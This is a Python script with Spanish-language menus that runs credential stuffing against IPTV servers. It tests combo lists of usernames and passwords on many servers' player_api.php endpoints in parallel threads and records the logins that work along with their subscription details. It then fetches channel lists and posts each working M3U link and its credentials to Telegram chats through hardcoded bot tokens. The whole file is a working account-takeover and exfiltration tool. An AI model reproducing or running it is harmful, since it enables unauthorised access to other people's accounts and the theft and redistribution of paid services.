
import os
import sys
import requests
from tqdm import tqdm
from colorama import Fore, Style, Back, init
from datetime import datetime, timezone
from threading import Event
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import random
import re

init(autoreset=True)

print("\nPara salir del script en cualquier momento, pulsa " + Fore.CYAN + Style.BRIGHT + "CTRL+C" + Style.RESET_ALL + "\n")

MESES = [
    "enero", "febrero", "marzo", "abril", "mayo", "junio",
    "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"
]

def convert_timestamp_to_date(timestamp, is_expiration=False):
    if timestamp:
        try:
            fecha = datetime.fromtimestamp(int(timestamp), tz=timezone.utc)
            return f"{fecha.day} {MESES[fecha.month - 1]} {fecha.year}"
        except ValueError:
            return "Fecha inválida"
    return "Ilimitado" if is_expiration else "No disponible"

def check_url_common(session, url, username, password, stop_event, timeout):
    if stop_event.is_set():
        return None, None
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    full_url = f"{url}/player_api.php?username={username}&password={password}"
    try:
        response = session.get(full_url, timeout=timeout)
        if response.ok:
            data = response.json().get("user_info", {})
            if data.get("auth") == 1:
                return (
                    url,
                    (
                        f"🔑 Combo➤ {username}:{password}",
                        f"🛰 Act Con➤ {data['active_cons']}",
                        f"✅ Max Con➤ {data['max_connections']}",
                        f"🪄 Creación➤ {convert_timestamp_to_date(data['created_at'])}",
                        f"📅 Expiración➤ {convert_timestamp_to_date(data['exp_date'], is_expiration=True)}",
                        username,
                        password
                    )
                )
    except requests.exceptions.RequestException:
        pass
    return None, None

def parse_credentials(input_string):
    if ':' in input_string and not input_string.startswith('http'):
        return input_string.split(':')
    elif 'username=' in input_string and 'password=' in input_string:
        parts = input_string.split('?')[-1].split('&')
        username = next((p.split('=')[1] for p in parts if p.startswith('username=')), None)
        password = next((p.split('=')[1] for p in parts if p.startswith('password=')), None)
        return username, password
    else:
        return None, None

def load_used_credentials(filename):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as file:
                return set(json.load(file))
        except json.JSONDecodeError:
            print("Advertencia: archivo JSON malformado. Inicializando un nuevo archivo.")
            return set()
    return set()

def save_used_credentials(filename, used_credentials):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'w') as file:
        json.dump(list(used_credentials), file)

def fetch_channel_list(session, url, username, password, timeout):
    channel_list_url = f"{url}/player_api.php?username={username}&password={password}&action=get_live_categories"
    try:
        response = session.get(channel_list_url, timeout=timeout)
        if response.ok:
            categories = response.json()
            if isinstance(categories, list):
                return [category['category_name'] for category in categories if 'category_name' in category]
        else:
            print(f"Error en la respuesta de la API: {response.status_code}")
    except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
        print(f"Error al obtener lista de categorías de canales: {e}")
    return []

def contains_emoji_or_special(text):
    emoji_pattern = re.compile("["
                               u"\U0001F600-\U0001F64F"
                               u"\U0001F300-\U0001F5FF"
                               u"\U0001F680-\U0001F6FF"
                               u"\U0001F700-\U0001F77F"
                               u"\U0001F780-\U0001F7FF"
                               u"\U0001F800-\U0001F8FF"
                               u"\U0001F900-\U0001F9FF"
                               u"\U0001FA00-\U0001FA6F"
                               u"\U0001FA70-\U0001FAFF"
                               u"\U00002702-\U000027B0"
                               u"\U000024C2-\U0001F251"
                               "]+", flags=re.UNICODE)
    return bool(emoji_pattern.search(text))

def format_channels_info(channels):
    if not channels:
        return "No hay información de canales"
    
    if any(contains_emoji_or_special(channel) for channel in channels):
        return "\n".join(channels)
    else:
        return "🔘".join(channels)

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            return True
        else:
            print(f"Error al enviar resultado a Telegram. Código de respuesta: {response.status_code}, Mensaje: {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error de conexión al enviar a Telegram: {e}")
        return False

def is_server_online(server_url, timeout=2):
    try:
        response = requests.get(server_url, timeout=timeout)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def explorar_directorio(base_dir):
    elementos = os.listdir(base_dir)
    if not elementos:
        print(f"No se encontraron elementos en {base_dir}.")
        return None, None

    carpetas = [e for e in elementos if os.path.isdir(os.path.join(base_dir, e))]
    archivos = [e for e in elementos if os.path.isfile(os.path.join(base_dir, e))]

    print(f"\nExplorando: {base_dir}")
    for idx, carpeta in enumerate(carpetas, 1):
        print(Fore.YELLOW + f"{idx}. [Carpeta] {carpeta}" + Style.RESET_ALL)

    for idx, archivo in enumerate(archivos, len(carpetas) + 1):
        print(Fore.CYAN + Style.NORMAL + f"{idx}. [Archivo] {archivo}" + Style.RESET_ALL)

    total_elementos = len(carpetas) + len(archivos)
    print(
        Fore.WHITE + Style.BRIGHT +
        f"{total_elementos + 1}. " +
        Back.GREEN + Fore.WHITE + Style.BRIGHT + "[Seleccionar Carpeta]" +
        Style.RESET_ALL + Fore.WHITE +
        " Procesar todos los archivos en esta carpeta"
    )

    print(
        Fore.WHITE + Style.BRIGHT +
        f"{total_elementos + 2}. " +
        Back.YELLOW + Fore.WHITE + Style.BRIGHT + "[Subir]" +
        Style.RESET_ALL + Fore.WHITE +
        " Volver al directorio anterior"
    )

    eleccion = int(input(f"Elige un elemento (1-{total_elementos + 2}): ").strip())

    if 1 <= eleccion <= len(carpetas):  # Navegar a la subcarpeta
        return explorar_directorio(os.path.join(base_dir, carpetas[eleccion - 1]))
    elif len(carpetas) < eleccion <= total_elementos:  # Seleccionar archivo
        archivo_seleccionado = os.path.join(base_dir, archivos[eleccion - len(carpetas) - 1])
        return archivo_seleccionado, None
    elif eleccion == total_elementos + 1:  # Seleccionar carpeta
        # Procesar todos los archivos en la carpeta actual
        return None, [os.path.join(base_dir, archivo) for archivo in archivos]
    elif eleccion == total_elementos + 2:  # Subir
        base_dir = os.path.dirname(base_dir)
        if base_dir == "":
            return None, None
        else:
            return explorar_directorio(base_dir)
    else:
        print("Opción inválida. Inténtalo de nuevo.")
        return explorar_directorio(base_dir)

def procesar_archivos_directorio(directorio):
    archivos = []
    for root, _, files in os.walk(directorio):
        for file in files:
            archivos.append(os.path.join(root, file))
    return archivos

def run_espejos():
    timeout = 2
    bot_token = "5438329046:AAFAB_GhDoHZX3tO9okctu11TMNB29Q_rTE"
    chat_id = "-1001590315666"

    def send_to_telegram_espejos(valid_servers, base_filename):
        message_lines = [
            (
                f"🫧 Servidores encontrados 🫧➤ {base_filename}\n"
                f"#{base_filename}\n\n"
                f"💻 Servidor➤ #º{server.split('://')[-1]}\n"
                f"👑 URL real➤ {server.split('://')[-1]}\n"
                f"🔮🔗M3U➤ {server}/get.php?username={username}&password={password}&type=m3u_plus\n"
                f"📱🔗Player_API➤ {server}/player_api.php?username={username}&password={password}\n\n"
                f"{combo_line}\n{active_cons}\n{max_connections}\n{created_at}\n{exp_date}\n"
            )
            for server, (combo_line, active_cons, max_connections, created_at, exp_date, username, password) in valid_servers.items()
        ]
        message = "\n".join(message_lines)
        if send_to_telegram(bot_token, chat_id, message):
            print("Resultado enviado a Telegram correctamente.")

    def check_servers(credentials, urls, base_filename, stop_event, bar_length, progress_suffix):
        valid_servers = {}
        tasks = []
        with requests.Session() as session:
            with ThreadPoolExecutor(max_workers=80) as executor:
                for credential in credentials:
                    username, password = parse_credentials(credential.strip())
                    if username and password:
                        for url in urls:
                            tasks.append(executor.submit(check_url_common, session, url, username, password, stop_event, timeout))
                for future in tqdm(as_completed(tasks), total=len(tasks), desc="Comprobando Servers", bar_format=f"{{l_bar}}{Fore.GREEN}{{bar:{bar_length}}}{Style.RESET_ALL}|{{n_fmt}}/{{total_fmt}} {progress_suffix}"):
                    if stop_event.is_set():
                        break
                    result = future.result()
                    if result:
                        url_result, details = result
                        if url_result:
                            valid_servers[url_result] = details
                            username, password = details[5], details[6]
                            tqdm.write(f"{Fore.GREEN + Style.BRIGHT}SUCCESS: Credenciales válidas para: {Fore.CYAN + Style.BRIGHT}{url_result} {Style.RESET_ALL}................ {Fore.YELLOW + Style.DIM}USER:PASS {Style.RESET_ALL}{Fore.BLUE+ Style.NORMAL}{username}:{password}{Style.RESET_ALL}")
                                
        return valid_servers

    def main():
        while True:
            print("\n" + Fore.RED + Style.BRIGHT + "=== INICIANDO ESCANEO DE ESPEJOS ===" + Style.RESET_ALL)
            stop_event = Event()
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                serversok_dir = os.path.join(script_dir, 'SERVERSOK')
                espejos_dir = os.path.join(script_dir, 'espejos')

                # Crear directorio 'espejos' si no existe
                os.makedirs(espejos_dir, exist_ok=True)

                # Menú para elegir entre SERVERSOK y espejos
                print("\nElige una carpeta para buscar servidores:")
                print(Fore.YELLOW + "1. SERVERSOK" + Style.RESET_ALL)
                print(Fore.YELLOW + "2. espejos" + Style.RESET_ALL)
                folder_choice = input("Introduce 1 o 2 para seleccionar la carpeta: ").strip()

                if folder_choice == '1':
                    selected_dir = serversok_dir
                elif folder_choice == '2':
                    selected_dir = espejos_dir
                else:
                    print("Selección inválida. Inténtalo de nuevo.")
                    continue

                # Explorar directorios y archivos
                archivo_seleccionado, archivos_seleccionados = explorar_directorio(selected_dir)
                if archivo_seleccionado:
                    urls_files = [archivo_seleccionado]
                elif archivos_seleccionados:
                    urls_files = archivos_seleccionados
                else:
                    print("No se seleccionó ningún archivo o carpeta.")
                    continue

                # Proceder con la selección de credenciales y escaneo
                credentials = []
                bar_length = 29
                progress_suffix = "servidores"
                
                print("\nElige una opción para el escaneo:")
                print(Fore.RED + Style.BRIGHT + "1. " + Style.RESET_ALL + "Mediante USER:PASS, M3U o Player_API")
                print(Fore.RED + Style.BRIGHT + "2. " + Style.RESET_ALL + "Seleccionar un archivo del listado de credenciales")
                choice = input("Introduce 1 o 2 para seleccionar la opción: ").strip()

                if choice == '1':
                    manual_credential = input("\n" + Fore.WHITE + Back.RED +"Introduce USER:PASS, M3U o Player_API:" + Style.RESET_ALL).strip()
                    username, password = parse_credentials(manual_credential)
                    if username and password:
                        credentials.append(f"{username}:{password}")
                    else:
                        print("Formato de credenciales no válido.")
                        return
                elif choice == '2':
                    credenciales_dir = os.path.join(script_dir, 'credenciales')
                    
                    # Navegar a través de subcarpetas dentro de 'credenciales'
                    while True:
                        archivo_seleccionado, archivos_seleccionados = explorar_directorio(credenciales_dir)
                        if archivo_seleccionado:
                            cred_file_path = archivo_seleccionado
                            with open(cred_file_path, 'r') as cred_file:
                                for line in cred_file:
                                    username, password = parse_credentials(line.strip())
                                    if username and password:
                                        credentials.append(f"{username}:{password}")
                            break
                        elif archivos_seleccionados:
                            for cred_file_path in archivos_seleccionados:
                                if os.path.exists(cred_file_path):  # Verificar si el archivo existe
                                    with open(cred_file_path, 'r') as cred_file:
                                        for line in cred_file:
                                            username, password = parse_credentials(line.strip())
                                            if username and password:
                                                credentials.append(f"{username}:{password}")
                            break
                        else:
                            print("No se seleccionó ningún archivo o carpeta.")
                            continue

                    bar_length = 15
                    progress_suffix = "combinaciones"
                else:
                    print(Fore.YELLOW + "Selección inválida. Inténtalo de nuevo." + Style.RESET_ALL)
                    continue

                for urls_file in urls_files:
                    if os.path.exists(urls_file):  # Verificar si el archivo existe antes de abrir
                        with open(urls_file, 'r') as file:
                            urls = [line.strip() for line in file.readlines() if line.strip()]
                        base_filename = input("Ingresa el nombre del server que se enviará a Telegram: ")

                        # Llamar a check_servers
                        valid_servers = check_servers(credentials, urls, base_filename, stop_event, bar_length, progress_suffix)
                        
                        if valid_servers:
                            # Crear archivo en la raíz de la carpeta 'espejos' con el nombre especificado
                            espejos_file_path = os.path.join(espejos_dir, f"{base_filename}.txt")
                            
                            # Leer servidores existentes
                            existing_servers = set()
                            if os.path.exists(espejos_file_path):
                                with open(espejos_file_path, 'r') as espejos_file:
                                    existing_servers = set(line.strip() for line in espejos_file if line.strip())

                            # Agregar nuevos servidores, evitando duplicados
                            new_servers = set(server.split('://')[-1] for server in valid_servers.keys())
                            all_servers = existing_servers.union(new_servers)

                            # Escribir servidores únicos en el archivo
                            with open(espejos_file_path, 'w') as espejos_file:
                                espejos_file.write("\n".join(all_servers))
                            
                            send_to_telegram_espejos(valid_servers, base_filename)
                            break  # Salir del bucle si se encuentran servidores válidos
                        else:
                            print("No se encontraron servidores válidos. Por favor, selecciona otro archivo de servidores.")
                    else:
                        print(f"El archivo {urls_file} no existe. Saltando...")

            except KeyboardInterrupt:
                print("\nInterrupción recibida. Cerrando el script...")
                print(Fore.CYAN + Style.BRIGHT + "Regresando al símbolo del sistema...")
                stop_event.set()
                sys.exit(0)
        
        # Mensaje al salir del bucle
        print("\n" + Fore.CYAN + Style.BRIGHT + "Regresando al símbolo del sistema...")

    main()

def run_m3u():
    timeout = 2
    bot_token = "5874775812:AAEE2DyFG1kwpy3KpVB12WAzS8BNxU8nxVQ"
    chat_id = "-1001447129132"

    def send_to_telegram_m3u(server, details, server_name, channels):
        combo_line, active_cons, max_connections, created_at, exp_date, username, password = details
        channels_info = format_channels_info(channels)
        
        message = (
            f"🌀𝘿𝙖𝙫𝙞𝙙𝙕𝙜𝙕 ❂ 𝙈3𝙐🌀"
            f"#{server_name}\n\n"
            f"💻 Servidor➤ #º{server.split('://')[-1]}\n"
            f"👑 URL real➤ {server.split('://')[-1]}\n\n"
            f"🔮🔗M3U➤ {server}/get.php?username={username}&password={password}&type=m3u_plus\n"
            f"📱🔗Player_API➤ {server}/player_api.php?username={username}&password={password}\n\n"
            f"{combo_line}\n{active_cons}\n{max_connections}\n{created_at}\n{exp_date}\n\n"
            f"🔅 LISTA DE CANALES 🔅\n{channels_info}\n\n"
            f"🟥▪️▫️🟧▪️▫️▪️🟨▪️▫️🟩▪️▫️🟦▪️▫️▪️🟪▪️▫️🟥▪️▫️"
        )
        return send_to_telegram(bot_token, chat_id, message)

    def check_servers_m3u(credentials, urls, server_name, stop_event, used_credentials, used_file, max_results):
        success_count = 0
        tasks = []
        random.shuffle(credentials)
        remaining_credentials = [cred for cred in credentials if cred not in used_credentials]

        server_online_status = is_server_online(urls[0])  # Assuming a single server URL is provided

        with requests.Session() as session:
            with ThreadPoolExecutor(max_workers=75) as executor:
                for credential in remaining_credentials:
                    username, password = parse_credentials(credential.strip())
                    if username and password:
                        for url in urls:
                            tasks.append(executor.submit(check_url_common, session, url, username, password, stop_event, timeout))
                
                with tqdm(total=len(tasks), desc="Comprobando M3U", bar_format=f"{{l_bar}}{Fore.GREEN}{{bar:30}}{Style.RESET_ALL} | {{n_fmt}}/{{total_fmt}} M3U", leave=True) as pbar:
                    for future in as_completed(tasks):
                        if stop_event.is_set() or success_count >= max_results:
                            break
                        result = future.result()
                        if result:
                            url_result, details = result
                            if url_result:
                                channels = fetch_channel_list(session, url_result, details[5], details[6], timeout)
                                
                                # Usar tqdm.write para imprimir mensajes sin afectar la barra de progreso
                                tqdm.write(f"{Fore.GREEN + Style.BRIGHT}SUCCESS: {Fore.WHITE + Back.BLUE + Style.BRIGHT}{url_result}{Style.RESET_ALL} .......................... {Fore.YELLOW + Style.DIM}USER:PASS {Style.RESET_ALL}{Fore.BLUE + Style.NORMAL}{details[5]}:{details[6]}{Style.RESET_ALL}")
                                
                                # Enviar a Telegram y confirmar
                                if send_to_telegram_m3u(url_result, details, server_name, channels):
                                    tqdm.write("Resultado enviado a Telegram correctamente.")
                                
                                success_count += 1
                                used_credentials.add(f"{details[5]}:{details[6]}")
                                
                        pbar.update(1)  # Actualiza la barra de progreso progresivamente

                if success_count < max_results:
                    tqdm.write("\n" + Fore.RED + Style.BRIGHT + f"Se han encontrado menos listas IPTV válidas ({success_count}) de las solicitadas ({max_results}).\n" + Style.RESET_ALL)
        
        if not server_online_status:
            print(Fore.RED + "Advertencia: El servidor proporcionado está inoperativo (offline)." + Style.RESET_ALL)

        save_used_credentials(used_file, used_credentials)

        return success_count

    def main():
        while True:
            print("\n" + Fore.BLUE + Style.BRIGHT + "=== INICIANDO ESCANEO DE M3U ===" + Style.RESET_ALL)
            stop_event = Event()
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                credenciales_dir = os.path.join(script_dir, 'credenciales')
                estado_dir = os.path.join(script_dir, 'estado_credenciales_M3U')
                os.makedirs(estado_dir, exist_ok=True)
                
                # Navegar por la carpeta de credenciales
                credentials = []
                while True:
                    archivo_seleccionado, archivos_seleccionados = explorar_directorio(credenciales_dir)
                    if archivo_seleccionado:
                        cred_file_path = archivo_seleccionado
                        with open(cred_file_path, 'r') as cred_file:
                            for line in cred_file:
                                username, password = parse_credentials(line.strip())
                                if username and password:
                                    credentials.append(f"{username}:{password}")
                        break
                    elif archivos_seleccionados:
                        for cred_file_path in archivos_seleccionados:
                            if os.path.exists(cred_file_path):  # Verificar si el archivo existe
                                with open(cred_file_path, 'r') as cred_file:
                                    for line in cred_file:
                                        username, password = parse_credentials(line.strip())
                                        if username and password:
                                            credentials.append(f"{username}:{password}")
                        break
                    else:
                        print("No se seleccionó ningún archivo o carpeta.")
                        continue

                used_file = os.path.join(estado_dir, os.path.splitext(os.path.basename(cred_file_path))[0] + ".json")
                used_credentials = load_used_credentials(used_file)
                
                server_name = input("Ingresa el nombre del server que se enviará a Telegram: ").strip()
                max_results = int(input("¿Cuántas listas IPTV deseas enviar? "))

                server_input = input("Introduce el nombre del servidor y su puerto (nombre:puerto): ").strip()
                if not server_input.startswith(("http://", "https://")):
                    server_input = "http://" + server_input
                server_url = server_input

                if is_server_online(server_url):
                    success_count = check_servers_m3u(credentials, [server_url], server_name, stop_event, used_credentials, used_file, max_results)
                    if success_count > 0:
                        break
                else:
                    print(Fore.RED + Style.BRIGHT +"ADVERTENCIA! El servidor proporcionado está inoperativo (offline)." + Style.RESET_ALL)
            except KeyboardInterrupt:
                print("\nInterrupción recibida. Cerrando el script...")
                stop_event.set()
                break
        
        # Mensaje al salir del bucle
        print("\n" + Fore.CYAN + Style.BRIGHT + "Regresando al símbolo del sistema...")

    main()

def menu_de_scripts():
    print("\nElige una opción:")
    print(Fore.RED + Style.BRIGHT + "1. ESPEJOS" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "2. M3U" + Style.RESET_ALL)
    
    try:
        choice = input("Introduce " + Fore.RED + Style.BRIGHT + "1" + Style.RESET_ALL + " o " + Fore.BLUE + Style.BRIGHT + "2 " + Style.RESET_ALL + " para seleccionar el script a ejecutar: ").strip()
        
        if choice == '1':
            run_espejos()
        elif choice == '2':
            run_m3u()
        else:
            print(Fore.YELLOW + "Selección inválida. Inténtalo de nuevo." + Style.RESET_ALL)
            menu_de_scripts()
    except KeyboardInterrupt:
        print("\nInterrupción recibida. Cerrando el script...")
        print(Fore.CYAN + Style.BRIGHT + "Regresando al símbolo del sistema...")
        sys.exit(0)

if __name__ == "__main__":
    menu_de_scripts()